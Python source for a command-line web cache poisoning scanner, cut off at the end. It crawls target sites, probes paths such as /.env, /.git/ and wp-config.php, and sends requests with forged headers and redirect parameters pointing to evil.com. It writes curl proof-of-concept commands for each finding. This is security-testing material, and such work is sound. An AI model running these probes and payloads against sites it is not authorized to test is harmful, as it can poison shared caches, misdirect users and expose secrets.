#!/usr/bin/env python3
"""
Web Cache Poisoning Scanner - CLI Tool
Focused ONLY on detecting actual cache poisoning vulnerabilities
"""

import asyncio
import aiohttp
import time
import random
import string
import json
import re
from urllib.parse import urlparse, urljoin
from datetime import datetime
import logging
from typing import List, Dict, Set
import argparse
import sys
import os

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class CachePoisonScanner:
    def __init__(self, rate_limit: float = 1.0, max_concurrent: int = 5):
        self.rate_limit = rate_limit
        self.max_concurrent = max_concurrent
        self.session = None
        self.vulnerabilities = []
        self.scan_results = []
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]

    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        connector = aiohttp.TCPConnector(limit=self.max_concurrent, limit_per_host=3)
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={'User-Agent': random.choice(self.user_agents)}
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def generate_cache_buster(self) -> str:
        """Generate unique cache buster parameter"""
        timestamp = int(time.time())
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"{timestamp}_{random_str}"

    async def discover_urls(self, domain: str) -> Set[str]:
        """Discover URLs using multiple methods"""
        logger.info(f"🔍 Discovering URLs for: {domain}")
        
        if not domain.startswith(('http://', 'https://')):
            domain = f"https://{domain}"
        
        discovered_urls = {domain}
        
        # Run discovery methods
        tasks = [
            self.discover_from_wayback(domain, discovered_urls),
            self.discover_from_robots(domain, discovered_urls),
            self.discover_from_sitemap(domain, discovered_urls),
            self.discover_from_html(domain, discovered_urls),
            self.discover_common_paths(domain, discovered_urls)
        ]
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info(f"📊 Discovered {len(discovered_urls)} URLs")
        return discovered_urls

    async def discover_from_wayback(self, domain: str, discovered_urls: Set[str]):
        """Discover URLs from Wayback Machine"""
        try:
            domain_name = urlparse(domain).netloc
            wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain_name}&output=json&fl=original&collapse=urlkey&limit=1000"
            
            async with self.session.get(wayback_url) as response:
                if response.status == 200:
                    content = await response.text()
                    lines = content.strip().split('\n')
                    
                    for line in lines:
                        if line and not line.startswith('['):
                            try:
                                url = json.loads(line)[0]
                                if url.startswith('http'):
                                    discovered_urls.add(url)
                            except:
                                continue
                    
                    logger.info(f"📜 Found {len(lines)} URLs from Wayback Machine")
        except Exception as e:
            logger.debug(f"Wayback discovery error: {str(e)}")

    async def discover_from_robots(self, domain: str, discovered_urls: Set[str]):
        """Discover URLs from robots.txt"""
        try:
            robots_url = urljoin(domain, '/robots.txt')
            async with self.session.get(robots_url) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    for line in content.split('\n'):
                        line = line.strip()
                        if line.startswith('Sitemap:'):
                            sitemap_url = line.split(':', 1)[1].strip()
                            await self.discover_from_sitemap_file(sitemap_url, discovered_urls)
                        elif line.startswith('Allow:') or line.startswith('Disallow:'):
                            path = line.split(':', 1)[1].strip()
                            if path and path != '/':
                                full_url = urljoin(domain, path)
                                discovered_urls.add(full_url)
        except Exception as e:
            logger.debug(f"Robots discovery error: {str(e)}")

    async def discover_from_sitemap(self, domain: str, discovered_urls: Set[str]):
        """Discover URLs from sitemap"""
        try:
            sitemap_url = urljoin(domain, '/sitemap.xml')
            await self.discover_from_sitemap_file(sitemap_url, discovered_urls)
        except Exception as e:
            logger.debug(f"Sitemap discovery error: {str(e)}")

    async def discover_from_sitemap_file(self, sitemap_url: str, discovered_urls: Set[str]):
        """Extract URLs from sitemap file"""
        try:
            async with self.session.get(sitemap_url) as response:
                if response.status == 200:
                    content = await response.text()
                    urls = re.findall(r'<loc>(.*?)</loc>', content)
                    
                    for url in urls:
                        discovered_urls.add(url)
                    
                    if 'sitemapindex' in content.lower():
                        sitemap_urls = re.findall(r'<loc>(.*?)</loc>', content)
                        for sub_sitemap in sitemap_urls:
                            await self.discover_from_sitemap_file(sub_sitemap, discovered_urls)
        except Exception as e:
            logger.debug(f"Sitemap file error: {str(e)}")

    async def discover_from_html(self, domain: str, discovered_urls: Set[str]):
        """Discover URLs from HTML content"""
        try:
            async with self.session.get(domain) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    # Extract links
                    href_pattern = r'href=["\']([^"\']*)["\']'
                    action_pattern = r'action=["\']([^"\']*)["\']'
                    src_pattern = r'src=["\']([^"\']*)["\']'
                    
                    for match in re.findall(href_pattern, content):
                        if match.startswith('/') or match.startswith('http'):
                            full_url = urljoin(domain, match)
                            discovered_urls.add(full_url)
                    
                    for match in re.findall(action_pattern, content):
                        if match:
                            full_url = urljoin(domain, match)
                            discovered_urls.add(full_url)
                    
                    for match in re.findall(src_pattern, content):
                        if match.endswith('.js'):
                            full_url = urljoin(domain, match)
                            discovered_urls.add(full_url)
        except Exception as e:
            logger.debug(f"HTML discovery error: {str(e)}")

    async def discover_common_paths(self, domain: str, discovered_urls: Set[str]):
        """Discover URLs by testing common vulnerable paths"""
        common_paths = [
            '/api/', '/admin/', '/login/', '/register/', '/reset-password/',
            '/profile/', '/user/', '/account/', '/dashboard/', '/panel/',
            '/console/', '/debug/', '/test/', '/dev/', '/staging/', '/beta/',
            '/v1/', '/v2/', '/v3/', '/latest/', '/current/', '/public/',
            '/static/', '/assets/', '/js/', '/css/', '/images/', '/uploads/',
            '/downloads/', '/files/', '/media/', '/cache/', '/proxy/',
            '/redirect/', '/forward/', '/callback/', '/webhook/', '/hook/',
            '/notify/', '/ping/', '/health/', '/status/', '/info/', '/config/',
            '/settings/', '/preferences/', '/options/', '/help/', '/support/',
            '/contact/', '/about/', '/terms/', '/privacy/', '/legal/',
            '/sitemap.xml', '/robots.txt', '/.well-known/', '/.git/',
            '/.env', '/config.php', '/wp-config.php', '/phpinfo.php',
            '/info.php', '/test.php', '/debug.php'
        ]
        
        for path in common_paths:
            try:
                test_url = urljoin(domain, path)
                async with self.session.head(test_url, allow_redirects=False) as response:
                    if response.status in [200, 301, 302, 403, 401]:
                        discovered_urls.add(test_url)
            except Exception as e:
                logger.debug(f"Path testing error: {str(e)}")

    def prioritize_urls(self, urls: Set[str]) -> List[str]:
        """Prioritize URLs by vulnerability likelihood - STATIC URLs FIRST"""
        scored_urls = []
        
        for url in urls:
            score = 0
            
            # HIGHEST PRIORITY: Static URLs without parameters or wildcards
            if '?' not in url and '*' not in url and not any(x in url for x in ['.css', '.js', '.png', '.jpg', '.gif', '.ico', '.svg']):
                score += 10  # Base score for static URLs
            
            # API endpoints (static)
            if '/api/' in url and '?' not in url:
                score += 8
            
            # Admin areas (static)
            if '/admin/' in url and '?' not in url:
                score += 7
            
            # User-related endpoints (static)
            if any(x in url for x in ['/user/', '/profile/', '/account/']) and '?' not in url:
                score += 6
            
            # Authentication endpoints (static)
            if any(x in url for x in ['/login/', '/register/', '/reset-password/']) and '?' not in url:
                score += 6
            
            # Common vulnerable paths (static)
            if any(x in url for x in ['/dashboard/', '/panel/', '/console/', '/debug/', '/test/']) and '?' not in url:
                score += 5
            
            # Configuration files
            if any(x in url for x in ['/config/', '/settings/', '/.env', '/.git/', '/robots.txt', '/sitemap.xml']):
                score += 4
            
            # LOWER PRIORITY: URLs with parameters (dynamic)
            if '?' in url:
                score += 1  # Much lower score for dynamic URLs
            
            # LOWEST PRIORITY: Wildcards and static assets
            if '*' in url:
                score -= 5
            
            if any(x in url for x in ['.css', '.js', '.png', '.jpg', '.gif', '.ico', '.svg']):
                score -= 10  # Very low priority for static assets
            
            # Only include URLs with positive scores
            if score > 0:
                scored_urls.append((url, score))
        
        # Sort by score (highest first) - static URLs will be prioritized
        scored_urls.sort(key=lambda x: x[1], reverse=True)
        
        # Log prioritization results
        logger.info(f"📊 URL Prioritization Results:")
        for i, (url, score) in enumerate(scored_urls[:10], 1):  # Show top 10
            url_type = "STATIC" if '?' not in url and '*' not in url else "DYNAMIC"
            logger.info(f"  {i:2d}. [{url_type}] Score: {score:2d} - {url}")
        
        return [url for url, score in scored_urls]

    async def test_cache_poisoning(self, url: str) -> List[Dict]:
        """Test a URL for cache poisoning vulnerabilities"""
        logger.info(f"🎯 Testing: {url}")
        
        tests = []
        
        # Test header injection
        header_tests = await self.test_header_injection(url)
        tests.extend(header_tests)
        
        # Test parameter pollution
        param_tests = await self.test_parameter_pollution(url)
        tests.extend(param_tests)
        
        return tests

    async def test_header_injection(self, url: str) -> List[Dict]:
        """Test header injection cache poisoning"""
        tests = []
        
        poison_headers = [
            ('X-Forwarded-Host', 'evil.com'),
            ('X-Forwarded-Proto', 'http'),
            ('X-Original-URL', '/admin'),
            ('X-Rewrite-URL', '/admin'),
            ('X-Custom-IP-Authorization', '127.0.0.1'),
            ('X-Forwarded-Server', 'evil.com'),
            ('X-HTTP-Host-Override', 'evil.com'),
            ('Forwarded', 'for=evil.com;by=evil.com;host=evil.com')
        ]
        
        for header_name, header_value in poison_headers:
            test_result = await self.test_single_header(url, header_name, header_value)
            tests.append(test_result)
            await asyncio.sleep(self.rate_limit)
        
        return tests

    async def test_single_header(self, url: str, header_name: str, header_value: str) -> Dict:
        """Test single header injection"""
        cache_buster = self.generate_cache_buster()
        
        if '?' in url:
            poisoned_url = f"{url}&cb={cache_buster}"
        else:
            poisoned_url = f"{url}?cb={cache_buster}"
        
        try:
            # Step 1: Send poisoned request
            poison_headers = {
                'User-Agent': random.choice(self.user_agents),
                header_name: header_value
            }
            
            async with self.session.get(poisoned_url, headers=poison_headers) as poison_response:
                poison_content = await poison_response.text()
                poison_headers_resp = dict(poison_response.headers)
                poison_headers_resp['status'] = poison_response.status
                
                # Step 2: Send clean request
                clean_headers = {'User-Agent': random.choice(self.user_agents)}
                
                async with self.session.get(poisoned_url, headers=clean_headers) as clean_response:
                    clean_content = await clean_response.text()
                    clean_headers_resp = dict(clean_response.headers)
                    clean_headers_resp['status'] = clean_response.status
                    
                    # Step 3: Check for cache poisoning
                    cache_poisoned = self.detect_cache_poisoning(
                        poison_content, clean_content, 
                        poison_headers_resp, clean_headers_resp,
                        header_name, header_value
                    )
                    
                    if cache_poisoned:
                        self.vulnerabilities.append({
                            'type': 'header_injection_poisoning',
                            'url': url,
                            'header_name': header_name,
                            'header_value': header_value,
                            'poisoned_url': poisoned_url,
                            'severity': 'high',
                            'description': f'Cache poisoning via header injection: {header_name} = {header_value}',
                            'poisoned_content': poison_content[:500],
                            'clean_content': clean_content[:500],
                            'poisoned_headers': poison_headers_resp,
                            'clean_headers': clean_headers_resp,
                            'poisoned_status': poison_response.status,
                            'clean_status': clean_response.status,
                            'timestamp': datetime.now().isoformat()
                        })
                    
                    return {
                        'test_type': 'header_injection_poisoning',
                        'url': url,
                        'header_name': header_name,
                        'header_value': header_value,
                        'cache_poisoned': cache_poisoned,
                        'poisoned_status': poison_response.status,
                        'clean_status': clean_response.status,
                        'poisoned_url': poisoned_url,
                        'poisoned_content': poison_content[:200],
                        'clean_content': clean_content[:200]
                    }
                    
        except Exception as e:
            logger.error(f"Header test error: {str(e)}")
            return {
                'test_type': 'header_injection_poisoning',
                'url': url,
                'header_name': header_name,
                'error': str(e)
            }

    async def test_parameter_pollution(self, url: str) -> List[Dict]:
        """Test parameter pollution cache poisoning"""
        tests = []
        
        pollution_tests = [
            ('redirect', 'evil.com', 'legitimate.com'),
            ('url', 'evil.com', 'legitimate.com'),
            ('next', 'evil.com', 'legitimate.com'),
            ('target', 'evil.com', 'legitimate.com'),
            ('return', 'evil.com', 'legitimate.com'),
            ('link', 'evil.com', 'legitimate.com'),
            ('goto', 'evil.com', 'legitimate.com')
        ]
        
        for param, evil_value, legit_value in pollution_tests:
            test_result = await self.test_single_parameter(url, param, evil_value, legit_value)
            tests.append(test_result)
            await asyncio.sleep(self.rate_limit)
        
        return tests

    async def test_single_parameter(self, url: str, param: str, evil_value: str, legit_value: str) -> Dict:
        """Test single parameter pollution"""
        cache_buster = self.generate_cache_buster()
        
        if '?' in url:
            polluted_url = f"{url}&cb={cache_buster}&{param}={evil_value}&{param}={legit_value}"
        else:
            polluted_url = f"{url}?cb={cache_buster}&{param}={evil_value}&{param}={legit_value}"
        
        try:
            # Step 1: Send polluted request
            headers = {'User-Agent': random.choice(self.user_agents)}
            
            async with self.session.get(polluted_url, headers=headers) as polluted_response:
                polluted_content = await polluted_response.text()
                polluted_headers_resp = dict(polluted_response.headers)
                polluted_headers_resp['status'] = polluted_response.status
                
                # Step 2: Send clean request
                clean_url = f"{url}?cb={cache_buster}&{param}={legit_value}"
                
                async with self.session.get(clean_url, headers=headers) as clean_response:
                    clean_content = await clean_response.text()
                    clean_headers_resp = dict(clean_response.headers)
                    clean_headers_resp['status'] = clean_response.status
                    
                    # Step 3: Check for cache poisoning
                    cache_poisoned = self.detect_cache_poisoning(
                        polluted_content, clean_content, 
                        polluted_headers_resp, clean_headers_resp,
                        param, evil_value
                    )
                    
                    if cache_poisoned:
                        self.vulnerabilities.append({
                            'type': 'parameter_pollution_poisoning',
                            'url': url,
                            'parameter': param,
                            'evil_value': evil_value,
                            'legit_value': legit_value,
                            'polluted_url': polluted_url,
                            'clean_url': clean_url,
                            'severity': 'high',
                            'description': f'Cache poisoning via parameter pollution: {param} = {evil_value}',
                            'polluted_content': polluted_content[:500],
                            'clean_content': clean_content[:500],
                            'polluted_headers': polluted_headers_resp,
                            'clean_headers': clean_headers_resp,
                            'polluted_status': polluted_response.status,
                            'clean_status': clean_response.status,
                            'timestamp': datetime.now().isoformat()
                        })
                    
                    return {
                        'test_type': 'parameter_pollution_poisoning',
                        'url': url,
                        'parameter': param,
                        'evil_value': evil_value,
                        'cache_poisoned': cache_poisoned,
                        'polluted_status': polluted_response.status,
                        'clean_status': clean_response.status,
                        'polluted_url': polluted_url,
                        'clean_url': clean_url,
                        'polluted_content': polluted_content[:200],
                        'clean_content': clean_content[:200]
                    }
                    
        except Exception as e:
            logger.error(f"Parameter test error: {str(e)}")
            return {
                'test_type': 'parameter_pollution_poisoning',
                'url': url,
                'parameter': param,
                'error': str(e)
            }

    def detect_cache_poisoning(self, poisoned_content: str, clean_content: str, 
                             poisoned_headers: Dict, clean_headers: Dict,
                             injection_type: str, injection_value: str) -> bool:
        """Detect if cache was actually poisoned"""
        
        # Check for obvious false positives first
        if self.is_false_positive(poisoned_headers, clean_headers, poisoned_content, clean_content):
            return False
        
        # Method 1: Content comparison - if poisoned content is returned in clean request
        if poisoned_content == clean_content and len(poisoned_content) > 0:
            # Additional check: make sure it's not just a generic error page
            if not self.is_generic_error_page(poisoned_content):
                logger.warning(f"🎯 Cache poisoning detected via content match: {injection_type}={injection_value}")
                return True
        
        # Method 2: Check if injection value appears in clean response
        if injection_value.lower() in clean_content.lower():
            # Additional check: make sure it's not just a generic error page
            if not self.is_generic_error_page(clean_content):
                logger.warning(f"🎯 Cache poisoning detected via injection: {injection_type}={injection_value}")
                return True
        
        # Method 3: Cache hit indicators with proper validation
        if self.is_actual_cache_poisoning(poisoned_headers, clean_headers, poisoned_content, clean_content):
            logger.warning(f"🎯 Cache poisoning detected via cache analysis: {injection_type}={injection_value}")
            return True
        
        return False

    def is_false_positive(self, poisoned_headers: Dict, clean_headers: Dict, 
                         poisoned_content: str, clean_content: str) -> bool:
        """Check for obvious false positives"""
        
        # Check 1: Both responses are 404/error pages with cache miss
        poisoned_status = poisoned_headers.get('status', 200)
        clean_status = clean_headers.get('status', 200)
        
        if poisoned_status in [404, 403, 500, 502, 503] and clean_status in [404, 403, 500, 502, 503]:
            # Check if both have cache miss indicators
            poisoned_cache_miss = self.has_cache_miss_indicators(poisoned_headers)
            clean_cache_miss = self.has_cache_miss_indicators(clean_headers)
            
            if poisoned_cache_miss and clean_cache_miss:
                logger.debug(f"False positive detected: Both responses are error pages with cache miss")
                return True
        
        # Check 2: Both responses have no-cache headers
        poisoned_no_cache = self.has_no_cache_headers(poisoned_headers)
        clean_no_cache = self.has_no_cache_headers(clean_headers)
        
        if poisoned_no_cache and clean_no_cache:
            logger.debug(f"False positive detected: Both responses have no-cache headers")
            return True
        
        # Check 3: Content is identical but it's a generic error page
        if poisoned_content == clean_content and self.is_generic_error_page(poisoned_content):
            logger.debug(f"False positive detected: Identical generic error page content")
            return True
        
        return False

    def has_cache_miss_indicators(self, headers: Dict) -> bool:
        """Check if headers indicate cache miss"""
        cache_indicators = [
            'X-Cache: MISS',
            'cf-cache-status: DYNAMIC',
            'X-Cacheable: NO',
            'Cache-Control: no-cache',
            'Cache-Control: no-store',
            'Cache-Control: private'
        ]
        
        header_str = str(headers).lower()
        return any(indicator.lower() in header_str for indicator in cache_indicators)

    def has_no_cache_headers(self, headers: Dict) -> bool:
        """Check if headers indicate no caching"""
        no_cache_indicators = [
            'no-cache',
            'no-store', 
            'private',
            'must-revalidate'
        ]
        
        cache_control = headers.get('Cache-Control', '').lower()
        return any(indicator in cache_control for indicator in no_cache_indicators)

    def is_generic_error_page(self, content: str) -> bool:
        """Check if content is a generic error page"""
        generic_indicators = [
            '<title>404',
            '<title>403',
            '<title>500',
            'page not found',
            'access denied',
            'internal server error',
            'error occurred',
            'not found',
            'forbidden',
            'server error'
        ]
        
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in generic_indicators)

    def is_actual_cache_poisoning(self, poisoned_headers: Dict, clean_headers: Dict,
                                poisoned_content: str, clean_content: str) -> bool:
        """Check for actual cache poisoning indicators"""
        
        # Check 1: Poisoned request was MISS, clean request was HIT
        poisoned_cache_status = poisoned_headers.get('X-Cache-Hit', '') or poisoned_headers.get('CF-Cache-Status', '')
        clean_cache_status = clean_headers.get('X-Cache-Hit', '') or clean_headers.get('CF-Cache-Status', '')
        
        if 'MISS' in poisoned_cache_status and 'HIT' in clean_cache_status:
            # Additional validation: check if content contains malicious indicators
            if any(indicator in clean_content.lower() for indicator in ['evil.com', 'attacker.com', 'malicious.com', 'hacker.com']):
                return True
        
        # Check 2: Age header indicates caching occurred
        poisoned_age = poisoned_headers.get('Age', '0')
        clean_age = clean_headers.get('Age', '0')
        
        try:
            if int(clean_age) > int(poisoned_age) and int(clean_age) > 0:
                # Content was served from cache
                if any(indicator in clean_content.lower() for indicator in ['evil.com', 'attacker.com', 'malicious.com']):
                    return True
        except (ValueError, TypeError):
            pass
        
        # Check 3: ETag changed but content is suspicious
        poisoned_etag = poisoned_headers.get('ETag', '')
        clean_etag = clean_headers.get('ETag', '')
        
        if poisoned_etag != clean_etag and poisoned_etag and clean_etag:
            # ETag changed, but check if malicious content persists
            if any(indicator in clean_content.lower() for indicator in ['evil.com', 'attacker.com', 'malicious.com']):
                return True
        
        return False

    async def scan_domain(self, domain: str) -> Dict:
        """Scan a single domain for cache poisoning"""
        logger.info(f"🚀 Starting cache poisoning scan for: {domain}")
        
        # Discover URLs
        discovered_urls = await self.discover_urls(domain)
        
        # Prioritize URLs
        vulnerable_urls = self.prioritize_urls(discovered_urls)
        
        logger.info(f"🎯 Testing {len(vulnerable_urls)} most vulnerable URLs")
        
        # Test URLs and generate reports after each
        for i, url in enumerate(vulnerable_urls, 1):
            try:
                progress = (i / len(vulnerable_urls)) * 100
                logger.info(f"📝 Testing URL {i}/{len(vulnerable_urls)} ({progress:.1f}%): {url}")
                await self.test_cache_poisoning(url)
                
                # Generate incremental report after each URL (always)
                self.generate_incremental_report(domain, i, len(vulnerable_urls))
                
                # Show progress summary
                if i % 5 == 0 or i == len(vulnerable_urls):  # Every 5 URLs or last URL
                    logger.info(f"📊 Progress: {i}/{len(vulnerable_urls)} URLs tested, {len(self.vulnerabilities)} vulnerabilities found")
                
            except Exception as e:
                logger.error(f"Error testing {url}: {str(e)}")
                continue
        
        scan_result = {
            'domain': domain,
            'urls_discovered': len(discovered_urls),
            'urls_tested': len(vulnerable_urls),
            'vulnerabilities_found': len(self.vulnerabilities),
            'timestamp': datetime.now().isoformat()
        }
        
        self.scan_results.append(scan_result)
        return scan_result

    def generate_incremental_report(self, domain: str, current_url: int, total_urls: int):
        """Generate incremental report after each URL test"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Update live report file
        with open('live_cache_poison_report.txt', 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("LIVE CACHE POISONING SCAN REPORT\n")
            f.write("=" * 80 + "\n")
            f.write(f"Last Updated: {timestamp}\n")
            f.write(f"Domain: {domain}\n")
            f.write(f"Progress: {current_url}/{total_urls} URLs tested\n")
            f.write(f"Vulnerabilities Found: {len(self.vulnerabilities)}\n\n")
            
            if self.vulnerabilities:
                f.write("🎯 VULNERABILITIES FOUND SO FAR:\n")
                f.write("-" * 50 + "\n")
                
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    f.write(f"VULNERABILITY {i}:\n")
                    f.write(f"  Type: {vuln['type']}\n")
                    f.write(f"  URL: {vuln['url']}\n")
                    f.write(f"  Severity: {vuln['severity']}\n")
                    f.write(f"  Description: {vuln['description']}\n")
                    f.write(f"  Found: {vuln['timestamp']}\n")
                    
                    if vuln['type'] == 'header_injection_poisoning':
                        f.write(f"  Header: {vuln['header_name']} = {vuln['header_value']}\n")
                    elif vuln['type'] == 'parameter_pollution_poisoning':
                        f.write(f"  Parameter: {vuln['parameter']} = {vuln['evil_value']}\n")
                    
                    f.write("\n")
            else:
                f.write("✅ No vulnerabilities found yet...\n")
                f.write("Scan is still in progress...\n")
        
        # Also update live POC file
        with open('live_cache_poison_poc.txt', 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("LIVE CACHE POISONING POC\n")
            f.write("=" * 80 + "\n")
            f.write(f"Last Updated: {timestamp}\n")
            f.write(f"Domain: {domain}\n")
            f.write(f"Progress: {current_url}/{total_urls} URLs tested\n\n")
            
            if self.vulnerabilities:
                f.write("🎯 EXPLOITATION POCs:\n")
                f.write("-" * 30 + "\n")
                
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    f.write(f"POC {i}: {vuln['type'].upper()}\n")
                    f.write(f"Target: {vuln['url']}\n")
                    
                    if vuln['type'] == 'header_injection_poisoning':
                        f.write(f"curl -H '{vuln['header_name']}: {vuln['header_value']}' '{vuln['poisoned_url']}'\n")
                    elif vuln['type'] == 'parameter_pollution_poisoning':
                        f.write(f"curl '{vuln['polluted_url']}'\n")
                    
                    f.write("\n")
            else:
                f.write("No POCs available yet...\n")
        
        logger.info(f"📄 Live reports updated: {len(self.vulnerabilities)} vulnerabilities found so far")

    def generate_report(self, output_file: str = 'cache_poison_report.txt'):
        """Generate comprehensive cache poisoning report"""
        with open(output_file, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("WEB CACHE POISONING SCAN REPORT\n")
            f.write("=" * 80 + "\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Scanner Version: 1.0\n")
            f.write(f"Total Domains Scanned: {len(self.scan_results)}\n")
            f.write(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}\n\n")
            
            # Scan Summary
            f.write("SCAN SUMMARY\n")
            f.write("-" * 40 + "\n")
            for result in self.scan_results:
                f.write(f"Domain: {result['domain']}\n")
                f.write(f"  URLs Discovered: {result['urls_discovered']}\n")
                f.write(f"  URLs Tested: {result['urls_tested']}\n")
                f.write(f"  Vulnerabilities: {result['vulnerabilities_found']}\n")
                f.write(f"  Scan Time: {result['timestamp']}\n\n")
            
            if not self.vulnerabilities:
                f.write("✅ NO CACHE POISONING VULNERABILITIES DETECTED\n")
                f.write("All tested URLs appear to be protected against cache poisoning attacks.\n\n")
            else:
                f.write("🎯 CACHE POISONING VULNERABILITIES FOUND\n")
                f.write("=" * 60 + "\n\n")
                
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    f.write(f"VULNERABILITY {i}:\n")
                    f.write(f"  Type: {vuln['type']}\n")
                    f.write(f"  URL: {vuln['url']}\n")
                    f.write(f"  Severity: {vuln['severity']}\n")
                    f.write(f"  Description: {vuln['description']}\n")
                    f.write(f"  Timestamp: {vuln['timestamp']}\n")
                    
                    if vuln['type'] == 'header_injection_poisoning':
                        f.write(f"  Header: {vuln['header_name']} = {vuln['header_value']}\n")
                        f.write(f"  Poisoned URL: {vuln['poisoned_url']}\n")
                    elif vuln['type'] == 'parameter_pollution_poisoning':
                        f.write(f"  Parameter: {vuln['parameter']} = {vuln['evil_value']}\n")
                        f.write(f"  Polluted URL: {vuln['polluted_url']}\n")
                        f.write(f"  Clean URL: {vuln['clean_url']}\n")
                    
                    f.write(f"  Poisoned Status: {vuln.get('poisoned_status', 'N/A')}\n")
                    f.write(f"  Clean Status: {vuln.get('clean_status', 'N/A')}\n\n")
        
        logger.info(f"📄 Report generated: {output_file}")

    def generate_poc_file(self, poc_file: str = 'cache_poison_poc.txt'):
        """Generate detailed POC file with exploitation details"""
        with open(poc_file, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("WEB CACHE POISONING - PROOF OF CONCEPT\n")
            f.write("=" * 80 + "\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("⚠️  FOR AUTHORIZED SECURITY TESTING ONLY ⚠️\n\n")
            
            if not self.vulnerabilities:
                f.write("No vulnerabilities found to create POCs for.\n")
                return
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                f.write(f"POC {i}: {vuln['type'].upper()}\n")
                f.write("=" * 50 + "\n")
                f.write(f"Target URL: {vuln['url']}\n")
                f.write(f"Vulnerability Type: {vuln['type']}\n")
                f.write(f"Severity: {vuln['severity']}\n\n")
                
                if vuln['type'] == 'header_injection_poisoning':
                    f.write("EXPLOITATION METHOD: Header Injection\n")
                    f.write("-" * 40 + "\n")
                    f.write("Step 1: Send poisoned request with malicious header\n")
                    f.write(f"URL: {vuln['poisoned_url']}\n")
                    f.write("Headers:\n")
                    f.write(f"  {vuln['header_name']}: {vuln['header_value']}\n")
                    f.write("  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n\n")
                    
                    f.write("Step 2: Send clean request to same URL\n")
                    f.write(f"URL: {vuln['poisoned_url']}\n")
                    f.write("Headers:\n")
                    f.write("  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n\n")
                    
                    f.write("Step 3: Verify cache poisoning\n")
                    f.write("If the clean request returns the same content as the poisoned request,\n")
                    f.write("the cache has been successfully poisoned.\n\n")
                    
                    f.write("CURL COMMANDS:\n")
                    f.write("-" * 20 + "\n")
                    f.write("# Poisoned request\n")
                    f.write(f"curl -H '{vuln['header_name']}: {vuln['header_value']}' '{vuln['poisoned_url']}'\n\n")
                    f.write("# Clean request\n")
                    f.write(f"curl '{vuln['poisoned_url']}'\n\n")
                    
                elif vuln['type'] == 'parameter_pollution_poisoning':
                    f.write("EXPLOITATION METHOD: Parameter Pollution\n")
                    f.write("-" * 40 + "\n")
                    f.write("Step 1: Send request with polluted parameters\n")
                    f.write(f"URL: {vuln['polluted_url']}\n")
                    f.write("This URL contains duplicate parameters with malicious and legitimate values.\n\n")
                    
                    f.write("Step 2: Send request with clean parameters\n")
                    f.write(f"URL: {vuln['clean_url']}\n")
                    f.write("This URL contains only the legitimate parameter value.\n\n")
                    
                    f.write("Step 3: Verify cache poisoning\n")
                    f.write("If the clean request returns content affected by the malicious parameter,\n")
                    f.write("the cache has been successfully poisoned.\n\n")
                    
                    f.write("CURL COMMANDS:\n")
                    f.write("-" * 20 + "\n")
                    f.write("# Polluted request\n")
                    f.write(f"curl '{vuln['polluted_url']}'\n\n")
                    f.write("# Clean request\n")
                    f.write(f"curl '{vuln['clean_url']}'\n\n")
                
                f.write("RESPONSE ANALYSIS:\n")
                f.write("-" * 20 + "\n")
                f.write("Poisoned Response Status: {}\n".format(vuln.get('poisoned_status', 'N/A')))
                f.write("Clean Response Status: {}\n".format(vuln.get('clean_status', 'N/A')))
                f.write("\n")
                
                f.write("Poisoned Response Headers:\n")
                for header, value in vuln.get('poisoned_headers', {}).items():
                    if any(cache_indicator in header.lower() for cache_indicator in ['cache', 'etag', 'expires', 'age']):
                        f.write(f"  {header}: {value}\n")
                f.write("\n")
                
                f.write("Clean Response Headers:\n")
                for header, value in vuln.get('clean_headers', {}).items():
                    if any(cache_indicator in header.lower() for cache_indicator in ['cache', 'etag', 'expires', 'age']):
                        f.write(f"  {header}: {value}\n")
                f.write("\n")
                
                f.write("CONTENT COMPARISON:\n")
                f.write("-" * 20 + "\n")
                f.write("Poisoned Content (first 200 chars):\n")
                f.write(f"{vuln.get('poisoned_content', 'N/A')[:200]}...\n\n")
                f.write("Clean Content (first 200 chars):\n")
                f.write(f"{vuln.get('clean_content', 'N/A')[:200]}...\n\n")
                
                f.write("REMEDIATION:\n")
                f.write("-" * 20 + "\n")
                if vuln['type'] == 'header_injection_poisoning':
                    f.write("1. Implement proper header validation\n")
                    f.write("2. Use allowlist for trusted headers only\n")
                    f.write("3. Implement cache poisoning protection\n")
                    f.write("4. Use cache keys that include user-specific data\n")
                elif vuln['type'] == 'parameter_pollution_poisoning':
                    f.write("1. Implement proper parameter validation\n")
                    f.write("2. Use the first or last parameter value consistently\n")
                    f.write("3. Implement cache poisoning protection\n")
                    f.write("4. Use cache keys that include parameter order\n")
                
                f.write("\n" + "=" * 80 + "\n\n")
        
        logger.info(f"🔧 POC file generated: {poc_file}")

    def generate_json_report(self, json_file: str = 'cache_poison_results.json'):
        """Generate JSON report for programmatic analysis"""
        report_data = {
            'scan_info': {
